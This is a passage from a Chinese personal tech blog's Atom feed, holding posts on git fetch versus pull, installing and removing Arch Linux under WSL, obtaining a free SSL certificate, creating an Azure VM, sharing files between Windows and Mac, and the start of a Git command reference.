&lt;远程主机名&gt;&lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure><blockquote><p>git fetch 与 git pull 的区别。</p></blockquote><p>git fetch 表示从远程获取最新的版本到本地，但是不会自动合并。其过程用命令表示就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin master</span><br><span class="line">$ git log -p master..origin&#x2F;master</span><br><span class="line">$ git merge origin&#x2F;master</span><br></pre></td></tr></table></figure><p>另一种写法就是：      </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin master:tem</span><br><span class="line">$ git diff tem</span><br><span class="line">$ git merge tem</span><br></pre></td></tr></table></figure><p>上面这两种写法都是都是一个意思。唯一有所区别的就是使用 <code>tem</code>分支代替了<code>origin/master</code>分支的存在。其含义是： </p><ol><li>从远程<code>origin</code>主机的<code>master</code>主分支下载最新的版本到本地<code>origin/master</code>分支，或者<code>tem</code>分支。</li><li>比较本地master分支与origin/master（tem）分支的差异。</li><li>最后进行合并</li></ol><p>git pull，相当于从远程获取最新的版本并合并到本地。       </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><p>上述命令其实相当于git fetch 和 git merge<br>在实际使用中，git fetch更安全一些，因为在merge前，我们可以查看更新情况，然后再决定是否合并。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这片文章主要用来讲解&lt;code&gt;git pull&lt;/code&gt;命令的一些细节。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Win10 如何卸载 Arch Linux</title>
    <link href="https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/"/>
    <id>https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/</id>
    <published>2020-08-16T09:56:22.000Z</published>
    <updated>2020-08-23T02:46:19.997Z</updated>
    
    <content type="html"><![CDATA[<p>最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。</p><a id="more"></a><p>在正式卸载之前，有以下几点需要注意：</p><ol><li>不要试图通过 Microsoft Store 去卸载，那里只有安装按钮，没有卸载按钮。</li><li>秋季创意者更新之前，可以使用<code>lxrun</code>命令去进行卸载操作，但是秋季创意者更新之后该命令就被移除了。</li></ol><h3 id="查看发行版"><a href="#查看发行版" class="headerlink" title="查看发行版"></a>查看发行版</h3><p>列出当前已经安装且随时可用的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslconfig &#x2F;list</span><br></pre></td></tr></table></figure><p>列出所有发行版，包括正在安装、卸载和已损坏的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslconfig &#x2F;list &#x2F;all</span><br></pre></td></tr></table></figure><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>卸载已经安装的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wslconfig &#x2F;list &#x2F;all</span><br><span class="line">Windows Subsystem for Linux Distributions:</span><br><span class="line">Arch (Default)</span><br><span class="line">$ wslconfig &#x2F;unregister Arch</span><br><span class="line">Unregistering...</span><br></pre></td></tr></table></figure><p>上面是以<code>Arch Linux</code>为例进行卸载，其他发行版同理，只需要替换发行版的名称就可以了。</p><blockquote><p>注意: 卸载发行版时，会永久删除所有与该发行版有关的数据和设置。</p></blockquote><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.littlelanmoe.com/exp/494" target="_blank" rel="noopener">Windows 10 Linux子系统如何卸载？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/categories/Linux/Windows/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Arch Linux" scheme="https://www.0x2beace.com/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
    <title>Win10 如何安装 Arch Linux</title>
    <link href="https://www.0x2beace.com/how-to-install-arch-linux-on-win10/"/>
    <id>https://www.0x2beace.com/how-to-install-arch-linux-on-win10/</id>
    <published>2020-08-16T09:50:09.000Z</published>
    <updated>2020-08-16T10:00:10.873Z</updated>
    
    <content type="html"><![CDATA[<p>最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。</p><p>第一件需要做的事情就是配置开发环境。</p><a id="more"></a><h2 id="了解-WSL"><a href="#了解-WSL" class="headerlink" title="了解 WSL"></a>了解 WSL</h2><h3 id="什么是-WSL-？"><a href="#什么是-WSL-？" class="headerlink" title="什么是 WSL ？"></a>什么是 WSL ？</h3><p>Windows Linux Server (WSL) 又名Windows 子系统，它使得开发人员可以直接在未经修改得Windows 上运行 <code>Gun/Linux</code> 环境，也包括大多数命令行工具，实用程序员和应用程序员，而不会需要额外增加虚拟机。</p><h3 id="WSL-可以做什么"><a href="#WSL-可以做什么" class="headerlink" title="WSL 可以做什么"></a>WSL 可以做什么</h3><ul><li>你可以自行选择你喜欢的 <code>Gun/Linux</code> 发行版：Arch Linux、Ubuntu、OpenSuSE、Kail Linux、Debian、Fedora等。</li><li>运行通用的命令行，例如grep，sed，awk或其他ELF-64二进制文件。</li><li>轻松运行Bash Shell脚本和 <code>GNU/Linux</code> 命令行应用程序</li><li>使用自己的 <code>GNU/Linux</code> 分发程序包管理器安装其他软件。</li><li>使用类似Unix的命令行外壳调用Windows应用程序。</li><li>在Windows上调用 <code>GNU/Linux</code> 应用程序。</li></ul><p>有了这些功能，我们就可以完成很多工作，而不必担心安装虚拟机监控程序，从而享受Linux的好处。安装并准备好Win 10后，请按照以下步骤进行操作，并在其中添加Arch Linux。</p><h2 id="安装-WSL"><a href="#安装-WSL" class="headerlink" title="安装 WSL"></a>安装 WSL</h2><p>本文要安装的WSL 是 <a href="https://www.archlinux.org/" target="_blank" rel="noopener">Arch Linux</a> 。</p><blockquote><p>为什么要选择 Arch Linux？</p></blockquote><p>因为它是一个轻量级且灵活的Linux 发行版。</p><h3 id="为Linux-安装Windows-子系统"><a href="#为Linux-安装Windows-子系统" class="headerlink" title="为Linux 安装Windows 子系统"></a>为Linux 安装Windows 子系统</h3><p>这是一项使Windows能够“ 托管 ” Linux 的功能。所以需要先启用此功能。</p><p>以管理员的身份打开Power Shell，然后输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure><p>通常会重启一次你的电脑。</p><h3 id="安装Arch-Linux"><a href="#安装Arch-Linux" class="headerlink" title="安装Arch Linux"></a>安装Arch Linux</h3><p>我记得在2019 年，Windows 刚拥抱 Linux 时，Arch Linux 还可以直接从 Microsoft Store 直接下载，不知为何现在却搜不到了。</p><p>不过还是有其他办法手动安装，<a href="https://github.com/yuk7/ArchWSL/releases/tag/20.4.3.0" target="_blank" rel="noopener">打开该页面</a>，下载<code>Arch.zip</code>。</p><p>解压完成之后，可以看到如下文件：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200816171455.png" alt=""></p><p>双击<code>Arch.exe</code>应用程序，进行安装。</p><p>稍微等待一会，就可以看到Arch Linux 已经顺利安装完成了，然后按任意键退出。</p><h3 id="启动Arch-Linux"><a href="#启动Arch-Linux" class="headerlink" title="启动Arch Linux"></a>启动Arch Linux</h3><p>再次双击<code>Arch Linux</code>，不出意外的话，就可以看到<code>Arch Linux</code> 的控制台了，没错就是这么简单。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>第一次安装完成之后，需要手动做一些配置，初始化并更新系统。</p><p>在终端或<code>CMD</code> 中输入<code>WSL</code> 进入<code>Arch Linux</code>。</p><p>编辑 <code>/etc/pacman.d/mirrorlist</code>，去掉<code>China</code>节点 前面的<code>##</code>，以及下面的<code>Server</code>下面的<code>##</code>。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line"></span><br><span class="line">pacman-key --populate archlinux</span><br></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 更新 GPG key</span><br><span class="line">pacman -Sy archlinux-keyring</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 更新系统，速度快慢与镜像源有关</span><br><span class="line">pacman -Syyu base base-devel</span><br></pre></td></tr></table></figure><h2 id="个性化"><a href="#个性化" class="headerlink" title="个性化"></a>个性化</h2><p>Arch Linux 默认的样式并不好看，和CMD 都是黑漆漆的一片。</p><p>因为Arch Linux 默认使用的 Bash，如果你和我一样，更喜欢 Zsh 的话，那就请继续看下去。</p><h3 id="安装ZSH"><a href="#安装ZSH" class="headerlink" title="安装ZSH"></a>安装ZSH</h3><p>既然要安装Zsh，那就不得不安装<code>oh-my-zsh</code>了，所以这里一起安装了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S zsh oh-my-zsh-git</span><br></pre></td></tr></table></figure><h3 id="安装Spaceship-ZSH"><a href="#安装Spaceship-ZSH" class="headerlink" title="安装Spaceship ZSH"></a>安装Spaceship ZSH</h3><p><a href="https://github.com/denysdovhan/spaceship-prompt" target="_blank" rel="noopener">Spaceship ZSH</a> 是Zsh 的提示符工具。</p><ol><li><p>克隆仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot;</span><br></pre></td></tr></table></figure></li><li><p>链接文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot;</span><br></pre></td></tr></table></figure></li><li><p>更改默认theme </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.zshrc</span><br><span class="line">ZSH_THEME&#x3D;&quot;spaceship&quot;</span><br></pre></td></tr></table></figure></li></ol><p>重启终端即可。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/way-zer/way-zer.github.com/issues/2" target="_blank" rel="noopener">安装ArchWSL（Windows 下的Arch Linux 子系统）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。&lt;/p&gt;
&lt;p&gt;第一件需要做的事情就是配置开发环境。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/categories/Linux/Windows/"/>
    
    
    <category term="Windows" scheme="https://www.0x2beace.com/tags/Windows/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="WSL" scheme="https://www.0x2beace.com/tags/WSL/"/>
    
    <category term="Arch Linux" scheme="https://www.0x2beace.com/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
    <title>如何申请免费的SSL 证书</title>
    <link href="https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/"/>
    <id>https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/</id>
    <published>2020-08-14T10:03:13.000Z</published>
    <updated>2020-09-11T08:19:38.273Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>像这类提供免费 SSL 证书的网站非常多，这里我选择的平台是 <a href="https://freessl.cn/apply?domains=8188.com%252C*.8188.com&product=letsencrypt02&from=" target="_blank" rel="noopener">FreeSSL.cn</a> 。</p><p>在正式开始之前，你得准备一个邮箱，<a href="https://freessl.cn/register" target="_blank" rel="noopener">注册</a> 一个 <code>FreeSSL.cn</code> 账号，然后登录。</p><p>将需要申请证书的域名填写在输入框中，选择多域名通配符，然后点击创建免费的SSL 证书。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814172918.png" alt=""></p><p>我这里选择的是泛域名，根据你自己的实际情况，去创建相应子域名的证书：</p><ul><li><code>example.com</code>：主域名</li><li><code>*.example.com</code>：泛域名</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814174731.png" alt=""></p><p>选择浏览器生成。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814175011.png" alt=""></p><p>点击确认创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814174930.png" alt=""></p><h3 id="添加TXT-记录"><a href="#添加TXT-记录" class="headerlink" title="添加TXT 记录"></a>添加TXT 记录</h3><p>打开需要申请 SSL 证书的域名管理后台，找到 DNS 管理。</p><p>添加 TXT 验证，将刚才的记录值与TXT 记录添加到对应的TXT 类型。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814180141.png" alt=""></p><p>注意⚠️：记录值区分大小写。</p><p>检测是否配置成功。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814175520.png" alt=""></p><p>在完成验证之前不要离开当前页面，验证成功之后，点击验证。</p><p>如果配置成功没问题，就可以点击验证，下载证书就完成了。</p><p>注意⚠️：使用此方式获取的证书，有效期只有三个月。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="HTTPS" scheme="https://www.0x2beace.com/tags/HTTPS/"/>
    
    <category term="SSL" scheme="https://www.0x2beace.com/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你如何创建启动 Azure 实例</title>
    <link href="https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/"/>
    <id>https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/</id>
    <published>2020-08-12T15:49:19.000Z</published>
    <updated>2020-08-27T06:26:47.806Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。</p><p>一是方便自己以后回顾，二是给其他人作为参考。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>因为本文是创建微软云，所以首先你得有一个微软账号。</p><p>打开 <a href="https://azure.microsoft.com/zh-cn/" target="_blank" rel="noopener">Microsoft Azure</a> 进行登录，登录成功之后，进入<a href="https://portal.azure.com/#home" target="_blank" rel="noopener">云服务管理后台</a>。</p><h2 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h2><p>点击创建资源。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135350.png" alt=""></p><p>可以搜索你想创建的云服务类型，这里我选择的是 <code>Ubuntu Server 18.04 LTS</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135625.png" alt=""></p><p>点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135731.png" alt=""></p><p>放心，这里的创建并不是正真意义上的创建。接下来需要为机器预设配置。</p><p>下面对常见的配置进行简单说明：</p><ul><li><code>资源组</code>：用来分配一些权限以及策略。</li><li><code>虚拟机名称</code>：你希望用什么名称来称呼这台机器（通常是英文）</li><li><code>区域</code>：选择机器所在地区</li><li><code>映像</code>：选择操作系统</li><li><code>大小</code>：选择一个合适的负责类型，可以理解成机器的硬件配置。</li><li><code>身份验证类型</code>：通常有两种：ssh 密钥和密码，强烈建议使用密钥而不使用密码（密哦存在被暴力破解的风险）。</li><li><code>用户名</code>：微软云默认没有给<code>root</code> 用户，这里需要指定用户名称。</li><li><code>公共入站端口</code>：通常是只开启<code>HTTP (80)</code>、<code>HTTPS (443)</code>、<code>SSH (22)</code> 。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812141205.png" alt=""></p><p>完成基本配置之后，点击<code>下一步：磁盘</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812141834.png" alt=""></p><p>Azure 默认只有一个用于短期存储的临时盘，而临时盘通常都很小。</p><p>默认的磁盘很小，如果想扩大有两种方式：</p><ul><li>创建新的磁盘，需要手动挂载。</li><li>更改默认磁盘的大小。</li></ul><p>配置完磁盘之后，点击<code>下一步：网络</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142034.png" alt=""></p><p>网络配置，公用ip 可以选择无，后面再去新建。</p><p>然后点击<code>下一步：管理</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142317.png" alt=""></p><p>管理、高级、标记这一块，如果没有特殊需求可以直接使用默认配置。</p><p>最后点击<code>查看+创建</code>，可以看到预设的配置信息，如果符合预期，点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142806.png" alt=""></p><p>下载私钥并保存好。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812152220.png" alt=""></p><p>此时，虽然已经创建好虚拟机，但是还不能直接使用，因为没有配置IP。</p><h2 id="关联IP"><a href="#关联IP" class="headerlink" title="关联IP"></a>关联IP</h2><p>Azure 和 AWS 不同，它并没有弹性IP 的概念，如果需要配置IP，需要在搜索栏中搜索<code>公共IP地址</code>，</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143323.png" alt=""></p><p>点击第一个搜索结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143437.png" alt=""></p><p>点击添加。</p><p>配置IP 基本信息，然后点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143641.png" alt=""></p><p>此时，只是创建了内网IP，并没有与外网IP 地址进行关联，</p><p>点击刚才新建的公共 IP 地址，点击配置。</p><p>资源类型选择网络接口，网络接口与对应的实例进行关联。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812153504.png" alt=""></p><p>关联成功之后，就可以进行连接了。</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ol><li>打开终端</li><li>请确保你对私钥具有只读访问权限。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 &lt;私钥&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>运行以下示例命令以连接到 VM。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &lt;私钥路径&gt; user@ip_address</span><br></pre></td></tr></table></figure><ul><li><code>user</code>：表示VM 用户</li><li><code>ip_address</code>：表示外网IP 地址</li></ul><h3 id="扩大默认磁盘大小"><a href="#扩大默认磁盘大小" class="headerlink" title="扩大默认磁盘大小"></a>扩大默认磁盘大小</h3><p>上面简单提到过，如果想要扩大默认磁盘的大小，有两种方式：</p><ol><li>添加新磁盘。这种方式需要手动挂载，如果对linux 并不熟悉，这种方式不推荐新手用户使用。</li><li>更改默认磁盘大小。</li></ol><p>第二种方式并不能直接更改，需要先将服务器停掉（注意⚠️：不是删除）。</p><p>搜索磁盘，点击第一个搜索结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812145110.png" alt=""></p><p>点击需要扩大的磁盘实例，注意：只能扩大，不能缩小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812145326.png" alt=""></p><p>然后点击保存即可。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，就已经完成了Azure 的创建了，这方面需要学习的还有很多，这里只是简单的整理了一下自己遇到的问题。</p><p>有些地方可能没说清楚，但如果能帮到你那真是太好了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。&lt;/p&gt;
&lt;p&gt;一是方便自己以后回顾，二是给其他人作为参考。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="云" scheme="https://www.0x2beace.com/tags/%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows 和 Mac 在局域网内如何共享文件？</title>
    <link href="https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/"/>
    <id>https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/</id>
    <published>2020-08-11T14:11:18.000Z</published>
    <updated>2020-08-13T11:43:07.419Z</updated>
    
    <content type="html"><![CDATA[<p>每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。<br>如果碰到了大一点的文件，就得换成网盘或者移动硬盘。</p><p>身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>这里准备的是用 Windows 作为主机创建共享文件。</p><p>首先要确认准备传输文件的 Windows 和 Mac 是在同一个路由器组成的局域网内。</p><p>然后打开 Windows 的文件资源管理器，在其根目录下创建一个共享文件夹，名称随意，自己知道就好了。</p><p>右键文件夹，点击属性，找到 共享 Tab，点击高级共享。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220638.png" alt=""></p><p>勾选共享此文件夹，点击确定。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220726.png" alt=""></p><p>然后回到共享文件夹，右键点击属性，找到共享，选择用户。</p><p>如果允许其他人写入，则选择 Everyone，更改为：读取/写入。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220755.png" alt=""></p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><h3 id="Windows-本机访问"><a href="#Windows-本机访问" class="headerlink" title="Windows 本机访问"></a>Windows 本机访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ComputerName 表示：你的计算机名称</span><br><span class="line"># ShareFolders 表示：共享文件夹名称</span><br><span class="line">file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F;</span><br></pre></td></tr></table></figure><h3 id="Mac-局域网访问"><a href="#Mac-局域网访问" class="headerlink" title="Mac 局域网访问"></a>Mac 局域网访问</h3><p>Mac 有两种方式：</p><ol><li>通过浏览器访问</li><li>通过访达访问，使用快捷键 <code>⌘ + k</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ComputerName 表示：需要访问的计算机名称</span><br><span class="line"># ShareFolders 表示：共享文件夹名称</span><br><span class="line">smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220823.png" alt=""></li></ol><p>通过验证之后，就能访问到共享文件夹了。</p><p>到这里应该就能顺利的在两个或多个电脑之间传输文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220855.png" alt=""></p><p>如果还不能访问，可以ping 一下对方的主机，如果没有ping通，检查一下防火墙设置。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220920.png" alt=""></p><p>如果防火墙关着，那么会 ping 不通。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200813193747.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/32026197" target="_blank" rel="noopener">Windows 和 Mac 在局域网内如何共享文件？</a></li><li><a href="https://blog.csdn.net/sscssz/article/details/50057759" target="_blank" rel="noopener">共享文件夹 一个实现Windows和Mac之间文件互传的简单方法</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。&lt;br&gt;如果碰到了大一点的文件，就得换成网盘或者移动硬盘。&lt;/p&gt;
&lt;p&gt;身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。&lt;/p&gt;</summary>
    
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Skill/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/categories/Skill/Windows/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/categories/Skill/Windows/Mac/"/>
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/tags/Windows/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Git 常用命令参考手册</title>
    <link href="https://www.0x2beace.com/git-common-command-reference-manual/"/>
    <id>https://www.0x2beace.com/git-common-command-reference-manual/</id>
    <published>2020-08-11T01:22:19.000Z</published>
    <updated>2020-08-11T01:24:32.528Z</updated>
    
    <content type="html"><![CDATA[<p>虽然每天都在使用<code>Git</code>，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些<code>Git</code> 常用命令。</p><a id="more"></a><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看全局配置列表</span><br><span class="line">$ git config --global --list</span><br><span class="line"># 查看局部配置列表</span><br><span class="line">$ git config --local --list</span><br><span class="line"></span><br><span class="line"># 设置全局用户名&#x2F;邮箱</span><br><span class="line">$ git config --global user.name &quot;yourName&quot;</span><br><span class="line">$ git config --global user.email &quot;example@example.com&quot;</span><br><span class="line"></span><br><span class="line"># 设置本地当前工作区仓库用户名&#x2F;邮箱</span><br><span class="line">$ git config --local user.name &quot;yourName&quot;</span><br><span class="line">$ git config --local user.email &quot;example@example.com&quot;</span><br><span class="line"></span><br><span class="line"># 将默认文本编辑器设置为 emacs&#x2F;vim</span><br><span class="line">$ git config --global core.editor emacs&#x2F;vim</span><br><span class="line"></span><br><span class="line"># 编辑当前仓库的配置文件</span><br><span class="line">$ git config -e  # 等价与 vim .git&#x2F;config</span><br><span class="line"># 编辑全局配置文件</span><br><span class="line">$ git config --global -e</span><br></pre></td></tr></table></figure><h3 id="命令别名配置"><a href="#命令别名配置" class="headerlink" title="命令别名配置"></a>命令别名配置</h3><figure class="highlight 